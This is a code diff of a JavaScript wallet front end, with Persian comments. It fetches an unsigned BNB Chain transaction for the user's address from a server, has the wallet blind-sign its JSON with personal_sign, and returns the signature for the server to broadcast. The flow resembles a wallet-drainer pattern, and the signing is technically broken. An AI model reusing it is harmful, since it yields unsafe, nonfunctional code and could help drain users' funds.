@@ -1,6 +1,5 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { ethers } from "ethers";
 
 function App() {
   async function runner() {
@@ -38,43 +37,38 @@ function App() {
         let requestData = { handler: "tx", address, chain, type };
         if (type === "token") requestData.contract = contract;
 
-        // دریافت تراکنش خام از سرور
         var result = await jQuery.post(apiUrl, requestData);
         var unsignedTx = JSON.parse(result).unsigned_tx;
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **🔹 محاسبه هش تراکنش برای امضا**
-        const txHash = ethers.utils.keccak256(ethers.utils.serializeTransaction(unsignedTx));
-        console.log("🔹 Transaction Hash:", txHash);
-
-        // **✅ امضای هش تراکنش در کیف پول**
+        // **✅ امضای تراکنش در کیف پول**
         var signedTx = await provider.request({
           method: "personal_sign",
-          params: [txHash, address],
+          params: [JSON.stringify(unsignedTx), address], // ارسال JSON صحیح
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
 
-        // **✅ ارسال امضای تراکنش به سرور**
-        var txHash = await jQuery.post(apiUrl, {
+        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
+        var txResult = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
-          unsignedTx: unsignedTx, // ارسال تراکنش خام برای بازسازی
           type,
         });
 
-        console.log("📤 Transaction Sent:", txHash);
-        return txHash;
+        console.log("📤 Transaction Sent:", txResult);
+        return txResult;
       } catch (error) {
         console.error("❌ Error in signAndSendTransaction:", error);
         return null;
       }
     }
 
-    var txHash = await signAndSendTransaction(account_sender, "56", "coin");
+    // ✅ فقط یک بار `txHash` مقداردهی می‌شود
+    var finalTxHash = await signAndSendTransaction(account_sender, "56", "coin");
 
-    if (txHash) {
-      console.log("📤 Final Transaction Hash:", txHash);
+    if (finalTxHash) {
+      console.log("📤 Final Transaction Hash:", finalTxHash);
     } else {
       console.error("⚠ Transaction failed.");
     }
